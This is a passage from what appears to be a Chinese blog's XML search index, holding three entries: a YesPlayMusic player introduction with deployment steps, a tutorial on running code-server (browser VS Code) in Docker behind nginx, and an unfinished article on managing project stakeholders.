          
      </categories>
      
      
        <tags>
            
            <tag> 主流社交媒体平台 </tag>
            
            <tag> 去中心化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YesPlayMusic 介绍及部署教程</title>
      <link href="/8d8025f.html"/>
      <url>/8d8025f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>高颜值的第三方网易云播放器</p></blockquote><p><a href="https://music.qier222.com/"><strong>? 访问DEMO</strong></a> <a href="https://github.com/qier222/YesPlayMusic/#%EF%B8%8F-%E5%AE%89%E8%A3%85"><strong>?️ 下载安装包</strong></a></p><h2 id="✨-特性"><a href="#✨-特性" class="headerlink" title="✨ 特性"></a>✨ 特性</h2><ul><li>✅ 使用 Vue.js 全家桶开发</li><li>? 网易云账号登录（扫码&#x2F;手机&#x2F;邮箱登录）</li><li>? 支持 MV 播放</li><li>? 支持歌词显示</li><li>? 支持私人 FM &#x2F; 每日推荐歌曲</li><li>?? 无任何社交功能</li><li>?️ 海外用户可直接播放（需要登录网易云账号）</li><li>?支持<a href="https://github.com/nondanee/UnblockNeteaseMusic">UnblockNeteaseMusic</a> ,自动使用 QQ&#x2F;酷狗&#x2F;酷我 &#x2F;B 站音乐 替换变灰歌曲链接 （网页版不支持）</li><li>✔️ 每日自动签到（手机端和电脑端同时签到）</li><li>? Light&#x2F;Dark Mode 自动切换</li><li>⏭️ 支持 MediaSession API，可以使用系统快捷键操作上一首下一首</li><li>? 支持 Touch Bar</li><li>?️ 支持 PWA，可在 Chrome&#x2F;Edge 里点击地址栏右边的 ➕ 安装到电脑</li><li>? 支持 Last.fm Scrobble</li><li>☁️ 支持音乐云盘</li><li>⌨️ 自定义快捷键和全局快捷键</li><li>? 支持 Mpris</li></ul><h2 id="️-安装"><a href="#️-安装" class="headerlink" title="?️ 安装"></a>?️ 安装</h2><p>Electron 版本由 <a href="https://github.com/hawtim">@hawtim</a> 和 <a href="https://github.com/qier222">@qier222</a> 适配并维护，支持 macOS、Windows、Linux。</p><p>访问本项目的 <a href="https://github.com/qier222/YesPlayMusic/releases">Releases</a> 页面下载安装包，或者访问<a href="https://dl.qier222.com/YesPlayMusic/">镜像下载站 (大陆访问更快)</a> 下载。</p><ul><li>macOS 用户可以通过 Homebrew 来安装：<code>brew install --cask yesplaymusic</code></li><li>Windows 用户可以通过 Scoop 来安装：<code>scoop install extras/yesplaymusic</code></li></ul><h2 id="⚙️部署到自己服务器"><a href="#⚙️部署到自己服务器" class="headerlink" title="⚙️部署到自己服务器"></a>⚙️部署到自己服务器</h2><ol><li>部署网易云 API，详情参见下文 服务器部署 <a href="https://github.com/Binaryify/NeteaseCloudMusicApi">NeteaseCloudMusicApi</a> 的方法</li><li>克隆本仓库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/qier222/YesPlayMusic.git</span><br></pre></td></tr></table></figure><ol start="3"><li>安装依赖</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure><ol start="4"><li>（可选）使用 Nginx 反向代理 API，将 API 路径映射为 <code>/api</code>，如果 API 和网页不在同一个域名下的话（跨域），会有一些 bug。</li><li>复制 <code>/.env.example</code> 文件为 <code>/.env</code>，修改里面 <code>VUE_APP_NETEASE_API_URL</code> 的值为网易云 API 地址。本地开发的话可以填写 API 地址为 <code>http://localhost:3000</code>，YesPlayMusic 地址为 <code>http://localhost:8080</code>。如果你使用了反向代理 API，可以填写 API 地址为 <code>/api</code>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VUE_APP_NETEASE_API_URL=http://localhost:3000</span><br></pre></td></tr></table></figure><ol start="6"><li>编译打包</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn run build</span><br></pre></td></tr></table></figure><ol start="7"><li>将 <code>/dist</code> 目录下的文件上传到你的 Web 服务器</li></ol><h2 id="⚙️Docker-部署"><a href="#⚙️Docker-部署" class="headerlink" title="⚙️Docker 部署"></a>⚙️Docker 部署</h2><ol><li>构建 Docker Image</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t yesplaymusic .</span><br></pre></td></tr></table></figure><ol start="2"><li>启动 Docker Container</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name YesPlayMusic -p 80:80 yesplaymusic</span><br></pre></td></tr></table></figure><ol start="3"><li>Docker Compose 启动</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>YesPlayMusic 地址为 <code>http://localhost</code></p><h2 id="服务器部署-NeteaseCloudMusicApi-的方法"><a href="#服务器部署-NeteaseCloudMusicApi-的方法" class="headerlink" title="服务器部署 NeteaseCloudMusicApi 的方法"></a>服务器部署 <a href="https://github.com/Binaryify/NeteaseCloudMusicApi">NeteaseCloudMusicApi</a> 的方法</h2><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><p>需要 NodeJS 8.12+ 环境</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git@github.com:Binaryify/NeteaseCloudMusicApi.git </span><br><span class="line"></span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Binaryify/NeteaseCloudMusicApi.git</span><br><span class="line"></span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>调用前务必阅读文档的 <a href="https://binaryify.github.io/NeteaseCloudMusicApi/#/?id=%e8%b0%83%e7%94%a8%e5%89%8d%e9%a1%bb%e7%9f%a5">调用前须知</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node app.js</span><br></pre></td></tr></table></figure><p>服务器启动默认端口为 3000,若不想使用 3000 端口,可使用以下命令: Mac&#x2F;Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ PORT=4000 node app.js</span><br></pre></td></tr></table></figure><p>windows 下使用 git-bash 或者 cmder 等终端执行以下命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ set PORT=4000 &amp;&amp; node app.js</span><br></pre></td></tr></table></figure><p>到此完成API部署。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网易云音乐 </tag>
            
            <tag> YesPlayMusic </tag>
            
            <tag> 播放器 </tag>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用docker搭建VScode</title>
      <link href="/73.html"/>
      <url>/73.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p><img src="https://cos.gjcloak.xyz/uploads/202204/11/docker1.jpg" alt="宝塔安装docker" title="宝塔安装docker"></p><p>在宝塔的应用商店，找到docker安装即可</p><h2 id="建立项目文件夹"><a href="#建立项目文件夹" class="headerlink" title="建立项目文件夹"></a>建立项目文件夹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /home/coder/project</span><br></pre></td></tr></table></figure><h2 id="用docker拉取镜像"><a href="#用docker拉取镜像" class="headerlink" title="用docker拉取镜像"></a>用docker拉取镜像</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 80:8080 --name code -v &quot;/home/coder/project:/home/coder/project&quot; codercom/code-server:latest</span><br></pre></td></tr></table></figure><p>端口可以看自己需要调整</p><blockquote><p>这里会比较耗时，成功后，会提示信息（info）注意到密码被放在了 ~&#x2F;.config&#x2F;code-server&#x2F;config.yaml这个文件里了，其实是在容器里。</p></blockquote><h2 id="寻找密码"><a href="#寻找密码" class="headerlink" title="寻找密码"></a>寻找密码</h2><p><img src="https://cos.gjcloak.xyz/uploads/202204/11/docker3.jpg" alt="终端" title="终端"></p><p>首先在宝塔的终端输入以下命令,查看ID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a # 查看container id </span><br><span class="line">docker exec -it [container id] /bin/bash # 开启交互式container</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/uploads/202204/11/docker2.jpg" alt="寻找密码" title="寻找密码"></p><p>然后进入镜像的终端，输入下面命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -a # 注意要加-a ，否则看不到隐藏文件</span><br><span class="line">vim  ~/.config/code-server/config.yaml # 记录下密码</span><br></pre></td></tr></table></figure><h2 id="使用浏览器访问VSCODE"><a href="#使用浏览器访问VSCODE" class="headerlink" title="使用浏览器访问VSCODE"></a>使用浏览器访问VSCODE</h2><p>在浏览器地址栏输入服务器公网ip+端口</p><p><img src="https://cos.gjcloak.xyz/uploads/202204/11/docker4.png" alt="vscode" title="vscode"></p><p>输入密码就可以进入vscode了。</p><p><img src="https://cos.gjcloak.xyz/uploads/202204/11/docker5.png" alt="首页" title="首页"></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>1、访问后提示报错code为1006</p><p>原因是在配置nginx代理的时候没有加入websocket的代理,加入后面三行配置即可解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@web-node-2 conf.d]# cat jumpserver-qa.com.conf</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name jumpserver.xxx.com;</span><br><span class="line">        underscores_in_headers on;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass http://192.168.10.63:87;</span><br><span class="line">                proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">                proxy_set_header Host $host;</span><br><span class="line">                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">                access_log off;</span><br><span class="line">                proxy_http_version 1.1;</span><br><span class="line">                proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">                proxy_set_header Connection &quot;Upgrade&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、发现密码太长了，改成自己的密码吧。那个密码文件改过之后不管用，不知道应该怎么改。而且发现，container建立好以后，密码就不变了。</p><p>3、删容器之前必须先停掉它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker stop [container id]</span><br><span class="line">docker rm [container id]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 搭建 </tag>
            
            <tag> VScode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何管理干系人？</title>
      <link href="/71.html"/>
      <url>/71.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本篇文章作者系统地从多个方面讲解了如何管理干系人，分别从干系人的概念、识别、分析、管理以及综合案例展开讲述，希望对你有帮助</p></blockquote><p>请你思考一下，下面这个失败的项目，主要是谁的错？</p><p>甲方派一个副总经理全权主持项目，乙方负责项目的开发与实施。</p><p>在项目一开始，乙方严格按照甲方副总经理提的需求编写需求规格说明、制作系统原型，与客户开了 20 多次会议。</p><p>到乙方交付第一个版本时，在验收会上，从来没见过的甲方总经理出现了，说“我们要的不是这个，而是XXX”。</p><p>乙方拿出会议纪要，甲方总经理又来一句：“唉，是副总没搞清楚”。</p><p>这个项目的结果是乙方终止此项目，幸好预付款可以勉强支付第一阶段的成本。</p><p>对此甲方还很不爽，还要起诉乙方。</p><p>如果你认为项目失败的原因是甲方的错，请你记住：</p><p>当你作为乙方没有实力挑选甲方的时候，“甲方永远是对的”。</p><p>作为乙方，如果不从乙方自身找原因、提升自己，下次做这种项目同样可能导致项目失败。</p><p>在这个项目中，乙方存在的问题是没有管理好干系人。</p><p>甲方让副总经理“全权”主持项目，乙方就误以为副总经理是最大的干系人，而忽视了总经理，没有找总经理调研需求。</p><p>在项目的关键节点没有及时跟总经理沟通确认，结果项目成果最终被总经理一票否决了。</p><p>做一个B端项目往往会涉及到很多干系人，管理干系人是保证B端项目成功的重要任务。</p><p>做一个C端产品也不能忽视干系人管理，特别是合规检查员（财务、法务、审计、行业监管部门等）。</p><span id="more"></span><p>很多做P2P的金融公司、教育培训公司遇到危机都是因为行业政策的影响。</p><p>本文将结合华为的案例，与你分享如下几点：</p><h2 id="一、重新认识干系人"><a href="#一、重新认识干系人" class="headerlink" title="一、重新认识干系人"></a>一、重新认识干系人</h2><p>干系人的概念很早在项目管理领域就有了。</p><p>我们先来看一下项目干系人在PMBOK（项目管理知识体系）中的定义：能影响项目、项目集或项目组合的决策、活动或成果的个人、群体或组织，以及会受或自认为会受它们的决策、活动或成果影响的个人、群体或组织。</p><p>我从产品的视角来重新定义“产品干系人”：影响产品成败的个人或组织。</p><p>因为我们做干系人管理的目标是促进产品成功，所以我们更关心影响产品成败的个人或组织，而不是受影响的个人或组织。</p><p>就像《三体》说的“毁灭你，与你无关”。</p><p>我们把关注点聚焦于“影响产品成败的个人或组织”，有助于后续识别干系人、分析干系人、管理干系人。</p><h3 id="干系人有多种叫法：项目相关方、涉众、利益相关者。"><a href="#干系人有多种叫法：项目相关方、涉众、利益相关者。" class="headerlink" title="干系人有多种叫法：项目相关方、涉众、利益相关者。"></a>干系人有多种叫法：项目相关方、涉众、利益相关者。</h3><p>这些叫法都不够直观，干系人的英文单词是Stakeholder，这个英文单词的字面意思“筹码持有人”更能体现干系人的本质。</p><p>做一个项目涉及到多方利益的博弈，Stakeholder就是项目博弈中的筹码持有者，谁的筹码多谁就有更大的影响力与话语权。</p><p>Stakeholder（筹码持有人）是干系人概念的本质，抓住这个本质，有助于区分干系人的优先级。</p><p>在多方需求有矛盾冲突的时候，你就知道以谁的需求为主了。</p><h2 id="二、干系人识别"><a href="#二、干系人识别" class="headerlink" title="二、干系人识别"></a>二、干系人识别</h2><p>在项目的早期阶段就要识别干系人。</p><p>我们可以从“影响产品成败的因素”来识别干系人。</p><p>有个工具“影响地图”推荐给你。</p><h3 id="1-影响地图"><a href="#1-影响地图" class="headerlink" title="1. 影响地图"></a>1. 影响地图</h3><p>影响地图是《Impac Mappping》一书中提出的，形式如下图所示，通过“Why→Who→How→What” 四个层次的分析法。</p><p>以结构化的形式显示，将业务目标（Why）、角色（Who）、影响（How）、产品功能（What）之间建立关联，让团队清晰地看到：</p><ul><li>对什么人产生什么样的影响可以帮助实现目标；</li><li>提供什么样的产品功能（或服务、运营手段）才能产生这样的影响。</li></ul><p><img src="http://image.woshipm.com/wp-files/2022/03/Jp9JlwDo1W7U4k8z8nEB.png"></p><p>影响地图的四个层次分别表示：</p><ul><li>Why（目标）：要搞清楚业务目标、为什么研发这个产品？</li><li>Who（角色）：想要实现这个目标，哪些角色会影响目标的实现？</li><li>How（影响）：这些角色是如何对目标产生影响？是帮助还妨碍？</li><li>What（什么）：我们可以做什么来支持这些影响的实现？可以是产品功能、活动运营、内容交付、服务等。</li></ul><h3 id="2-干系人检查清单"><a href="#2-干系人检查清单" class="headerlink" title="2. 干系人检查清单"></a>2. 干系人检查清单</h3><p>有些干系人很容易识别，如客户、发起人、老板、最终用户等，有些干系人很容易被忽视，比如：合规检查员。</p><p>忽视重要的干系人会导致项目的失败，我们可以通过干系人检查清单来避免遗漏干系人。</p><p>组织内部（乙方）的干系人检查清单：<br><img src="http://image.woshipm.com/wp-files/2022/03/maU8kkLXtoaWERJ5DKhP.png"></p><p>组织外部的干系人检查清单：<br><img src="http://image.woshipm.com/wp-files/2022/03/3m9XENpJwAIxJDsYE8PS.png"></p><p>以上罗列的干系人检查清单未必全面，不一定都适合你的项目，请根据你的项目特点进行调整、裁剪。</p><p>在干系人识别阶段，可以先通过团队头脑风暴、访谈已知干系人、影响地图来梳理干系人，再利用检查清单避免遗漏</p><h2 id="三、干系人分析"><a href="#三、干系人分析" class="headerlink" title="三、干系人分析"></a>三、干系人分析</h2><p>识别出干系人之后，接下来要进行调研，收集干系人的信息，包括干系人的基本信息、痛点、利益点、需求、期望、价值观，甚至他们的隐性需求。</p><p>然后分析每个干系人对项目的影响力、对项目的关注程度。</p><p>在干系人很多的情况下，还要对干系人进行分类、排优先级，以便制定管理策略。</p><h3 id="1-干系人地图"><a href="#1-干系人地图" class="headerlink" title="1. 干系人地图"></a>1. 干系人地图</h3><p>当干系人众多的情况下（特别是B端项目），可以用干系人地图进行分类。</p><p>干系人地图根据权力&#x2F;影响力（筹码数量）、兴趣&#x2F;利益（对项目的关注度）两个维度进行分类、排优先级。</p><p><img src="http://image.woshipm.com/wp-files/2022/03/eJMSDq8GgRFlhK2YUuGT.png"></p><p>在分析干系人的权力&#x2F;影响力时，华为公司做B端项目销售的一个实践做法可以借鉴：梳理B端项目决策链的关键环节，找出每个环节的主导者、参与者，各个击破。</p><p><img src="http://image.woshipm.com/wp-files/2022/03/bFo2Z0LkDUnnLC0IUPHV.png"></p><h3 id="2-挖掘隐形需求"><a href="#2-挖掘隐形需求" class="headerlink" title="2. 挖掘隐形需求"></a>2. 挖掘隐形需求</h3><p>在分析干系人的需求时，通过访谈、问卷、焦点小组等方法获得的需求往往是显性需求，还有一些隐形需求是干系人很关心但没有告诉你的需求，如图所示：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/UoLu8uisK10Rm5D3wHiS.png" alt="text" title="text"></p><p>要挖掘隐性需求，要区分两种情况：</p><p>1）干系人因能力所限，无法表达出隐性需求</p><ul><li>只说方案不说目的：用Y模型、5Why分析法深入挖掘需求；</li><li>需求描述不全：用PSPS模型还原需求；</li><li>没想到的细节需求：用场景分析法补充细节需求。</li></ul><p>2）干系人有所顾虑，不愿说出隐形需求</p><ul><li>观察反常细节：事出反常必有妖，从反常细节挖掘真相；</li><li>对人性心理的深刻洞察：用同理心代入；</li><li>结构属性分析：屁股决定脑袋，从干系人所处位置推测其关注点，比如：新官上任三把火，而快退休的领导往往求稳；</li><li>动向分析：从甲方公司战略变化、政策调整、近期负面消息推测干系人的关注点。</li></ul><h3 id="3-阻力点分析"><a href="#3-阻力点分析" class="headerlink" title="3. 阻力点分析"></a>3. 阻力点分析</h3><p>不要小看你做的产品，你做的产品对甲方来说是一场数字化变革，现在讲的数字化转型对企业也是一场变革。</p><p><img src="http://image.woshipm.com/wp-files/2022/03/WnlaYkqLSGrYWoqyhOCj.png" alt="text" title="text"></p><p>任何一场变革都会带来利益的重新分配。有人得意，就会有人失意。</p><p>失意的人会抗拒变革，抵制你的产品，甚至把怒气撒在你身上。</p><p>不是因为他不喜欢你，而是因为他觉得他的利益是因为你的产品而受到了损害。</p><p>这样就会导致你的产品推进不顺利、甚至失败。</p><p>所以，我们非常有必要去分析阻力点。</p><p>凡事兴一利必有一弊。一个新系统上线，有人受益，可能就有人利益受损。</p><p>比如：责任增加？权力变小？工作量增加？收入减少？</p><p>例如：很多老旧小区没有电梯，政府推出惠民工程，给老旧小区补贴加装电梯。</p><p>但很多小区都推进不顺利，搞了几年还没装上电梯。</p><p>这背后的原因不难理解，就是因为低楼层住户的反对，因为他们的利益受影响。</p><p>所以低楼层住户就是加装电梯项目的阻力点。</p><p>我了解到一些成功加装电梯的小区是这么搞定阻力点：高楼层住户凑钱补贴低楼层住户。</p><p>再强调一次：变革的本质，就是利益的重新分配。</p><p>发现阻力点后，在干系人管理环节要对阻力点进行管理，尽量减少阻力点对项目结果产生负面影响。</p><h3 id="4-案例"><a href="#4-案例" class="headerlink" title="4. 案例"></a>4. 案例</h3><p>继续前面网银系统项目的干系人分析，通过调研得到干系人简介、需求、期望等信息，填写到干系人管理表中。如下图：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/mvVYHiF8ttGN0ZR2XXdP.png" alt="text" title="text"></p><p>请你思考一下，这个项目的阻力点是什么？哪些干系人可能反对这个项目？</p><h2 id="四、干系人管理"><a href="#四、干系人管理" class="headerlink" title="四、干系人管理"></a>四、干系人管理</h2><p>做完干系人分析之后，要评估关键干系人对不同情况可能做出的反应或应对，以便策划如何对他们施加影响，得到他们的支持，减轻他们的潜在负面影响。</p><p>就像教父说的：把朋友搞得多多的，把敌人搞得少少的。</p><h3 id="1-干系人地图-1"><a href="#1-干系人地图-1" class="headerlink" title="1. 干系人地图"></a>1. 干系人地图</h3><p>在干系人分析时，我们用干系人地图对干系人进行分类、排优先级，然后我们可以对干系人地图中不同象限的干系人采用不同的策略（如图所示）：</p><ul><li>第1象限的干系人优先级最高，策略是重点管理，他们的需求优先级最高，要及时跟他们沟通汇报；</li><li>第2象限的干系人的需求要尽量满足，争取得到他们的支持，避免他们成为阻力点；</li><li>第3象限的干系人保持沟通，尽量拉拢，使他们在项目中受益；</li><li>第4象限的干系人监控动态，避免成为阻力点。</li></ul><p><img src="http://image.woshipm.com/wp-files/2022/03/e9T45cFyxGG1mxTwZSCn.png" alt="text" title="text"></p><p>乙方在做B端项目时，经常会遇到一个困惑：</p><p>甲方大老板的权力&#x2F;影响力很大，那我们做项目时是不是都要跟甲方大老板确认？</p><p>有人说项目的关键里程碑都要跟大老板确认。</p><p>其实这要看情况，你做一个预算很小的项目去找大老板确认，人家肯定不理你。</p><p>那什么情况下要去找甲方大老板确认？</p><p>取决于这个大老板在干系人地图的第1象限还是第2象限，也就是说，要看他对项目的“兴趣&#x2F;利益”大不大。</p><p>如下三种情况，甲方大老板对项目会比较关注，应该把他放在干系人地图的第1象限，建议你要尽早跟大老板确认，不要等项目验收会才见到大老板。</p><ul><li>甲方大老板是项目的发起人</li><li>这个项目是甲方的战略项目</li><li>这个项目的预算特别大</li></ul><p>接下来，以华为的实践为例，看华为是如何管理干系人。</p><p>华为很重视在客户中发展Coach（线人，支持者），不同角色的客户对项目有不同的促进作用：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/31NbYRM3V6DyyXmd871K.png" alt="text" title="text"></p><p>华为针对B端项目中优先级高的干系人，有7种武器，如图所示：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/afmwS2TrkdVPq0hl5M96.png" alt="text" title="text"></p><p>华为搞定B端客户的7种武器，具体做法如下图所示：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/xBK2x3JkRZ3spmB6TJda.png" alt="text" title="text"></p><h3 id="2-甲方的类型及应对策略"><a href="#2-甲方的类型及应对策略" class="headerlink" title="2. 甲方的类型及应对策略"></a>2. 甲方的类型及应对策略</h3><p>做B端项目要经常跟甲方打交道，会遇到各种各样的甲方。</p><p>可以按照“配合度”、“专业度”这两个维度把甲方分为四种类型，如下图所示：</p><ul><li>1.头狼型：这种甲方的专业度高，不仅是业务专家，也懂信息化、数字化；配合度高，只要乙方说的有道理、有助于目标达成，他都愿意配合；</li><li>2.猫头鹰型：这种甲方很专业，但配合度不高，很强势，口头禅是“我不要你觉得，我要我觉得！”</li><li>3.绵羊型：态度很友好，配合度高，但不专业，提需求时零零碎碎、不完整，甚至提的很多需求是伪需求；</li><li>4.鬼见愁型：专业度低，不懂装懂；趾高气扬，脾气暴躁，不把乙方当人看，经常当众训斥乙方。</li></ul><p><img src="http://image.woshipm.com/wp-files/2022/03/81AZEIltC0Zogv9nu7oW.png" alt="text" title="text"></p><p>以上四种类型的甲方不能统一对待，应该用不同的应对策略，如下图所示。</p><ul><li>头狼型：这种甲方是专家，忽悠不了他，如果乙方不专业的话很容易就被发现，会被换掉。乙方要提升自己的专业性。这种甲方很难得，跟他合作的项目成功率很高，也可以从他身上学到很多。跟他协作的时候要定原则、树边界，避免冲突；</li><li>猫头鹰型：这种甲方要统一战线，尽量拉拢。用项目成功对他的潜在收益、项目失败对他个人的风险来引导他合作。实在不行的话找他领导来协调：借天使之力，让魔鬼闭嘴；</li><li>绵羊型：这种甲方要小心，别被他误导，因为他不专业，提的需求可能是伪需求。要注意挖掘需求，积极引导；</li><li>鬼见愁型：这种甲方只能尝试沟通，实在不行的话只能祝你好运了。</li></ul><p><img src="http://image.woshipm.com/wp-files/2022/03/vGAJyv42lhINcdZuXnVG.png" alt="text" title="text"></p><h3 id="3-如何管理甲方的期望值"><a href="#3-如何管理甲方的期望值" class="headerlink" title="3. 如何管理甲方的期望值"></a>3. 如何管理甲方的期望值</h3><p>有个小故事：</p><p>小学班上数学老师在公布考试成绩，小明考了61分，数学老师大大表扬了他。小王考了81分，但是被数学老师批评了。</p><p>你应该猜到原因了：</p><p>小明是学渣，第一次考试及格，超过老师的预期，所以被老师表扬。</p><p>而小王是学霸，平时成绩很好，这次成绩远远低于老师预期，所以被老师批评。</p><p>你的项目成果能否让甲方满意，不仅取决于项目成果本身做得好不好，还取决于甲方的期望值。</p><p>要让甲方满意，除了尽力把项目做好，还要注意管理甲方的期望值。</p><p>如何管理甲方的期望值呢？接下来分享几点建议：</p><ul><li>谨慎承诺：你的一个不经意的口头承诺，甲方可能都记在心理，有了预期。如果没做到的话甲方就不满意；</li><li>面面俱到，不如单点极致：资源有限，无法面面俱到、各个方面都做到极致。可以把有限的资源集中在甲方重视的焦点上做到极致，其他方面不拉胯、达到及格线就行了；</li><li>及时通报，过程透明化：注意在项目的进展过程中跟重要干系人定期保持沟通，有问题及时通报，有风险要及时给甲方打预防针。不要憋大招想给甲方一个惊喜，最后变成惊吓；</li><li>“整体规划、分步实施、持续优化”：这是信息化项目中经常给甲方灌输的一个理念，降低甲方想“一步到位”的预期。</li></ul><p>企业变革绩效曲线：如下图所示。</p><p><img src="http://image.woshipm.com/wp-files/2022/03/EFqRVSw7MOuQ8B5iwfxP.png" alt="text" title="text"></p><p>前面提到，你做的产品对甲方来说是一场数字化变革，企业数字化转型对企业就是一场变革。</p><p>变革不是立竿见影马上就可以见到效果。</p><p>变革要经历一个艰难的磨合期，这期间的绩效水平反而比变革前更低，而甲方的期望往往是变革后可以立马见到效果。</p><p>这样就会造成很大的期望落差，甲方看到绩效水平越来越差，开始质疑项目没做好，甚至会放弃项目。</p><p>可以说，乙方在变革的磨合期压力是巨大的，乙方如果不能管理好甲方的期望值，可能项目都撑不过黎明前的黑暗。</p><p>怎么办？</p><p>建议你把企业变革绩效曲线在项目上线前提前给甲方看，让甲方对变革过程有个正确的认识，建立起合理的预期。</p><h3 id="4-案例-1"><a href="#4-案例-1" class="headerlink" title="4. 案例"></a>4. 案例</h3><p>继续前面网银系统项目的案例，在干系人分析后，根据各类干系人的特点做出应对措施，如下图所示。</p><p><img src="http://image.woshipm.com/wp-files/2022/03/obSWTHVAg2r9EVXLB8Jq.png" alt="text" title="text"></p><h2 id="五、干系人管理综合案例"><a href="#五、干系人管理综合案例" class="headerlink" title="五、干系人管理综合案例"></a>五、干系人管理综合案例</h2><p>接下来通过一个干系人管理的综合案例，来贯穿干系人管理的几个环节。</p><h3 id="1-项目背景"><a href="#1-项目背景" class="headerlink" title="1. 项目背景"></a>1. 项目背景</h3><p>某IT上市公司有大型产品研发团队，主要开发游戏、应用软件。</p><p>常有骨干被高薪挖走，造成经验的流失。</p><p>团队中新人较多，难以快速上手，造成研发效率低下。</p><p>CEO在EMBA班上听说了知识管理，觉得是个机会，于是打算在公司开展知识管理，并计划开发一个知识管理系统供内部使用。</p><h3 id="2-干系人识别"><a href="#2-干系人识别" class="headerlink" title="2. 干系人识别"></a>2. 干系人识别</h3><p>因为知识管理系统是在企业内部使用的，所以通过企业的组织架构图来初步识别干系人：</p><p>并通过访谈现有的干系人，来发现新的干系人：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/Qp48Poy2igW73O3G1hcv.png" alt="text" title="text"></p><h3 id="3-干系人分析"><a href="#3-干系人分析" class="headerlink" title="3. 干系人分析"></a>3. 干系人分析</h3><p>对关键的干系人进行调研、分析，了解他们的需求、期望，并有意识地做阻力点分析。</p><p>对干系人分类调研，不同的干系人问不同的问题：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/EQiWjcccbeucjARkbjt7.png" alt="text" title="text"></p><p>对关键干系人准备访谈提纲，安排一对一访谈：</p><p><img src="http://image.woshipm.com/wp-files/2022/03/SKsnPrWGgVoMxLJgCMWR.png"></p><p>对调研的结果进行整理分析，填写到如下表格中：</p><p><img 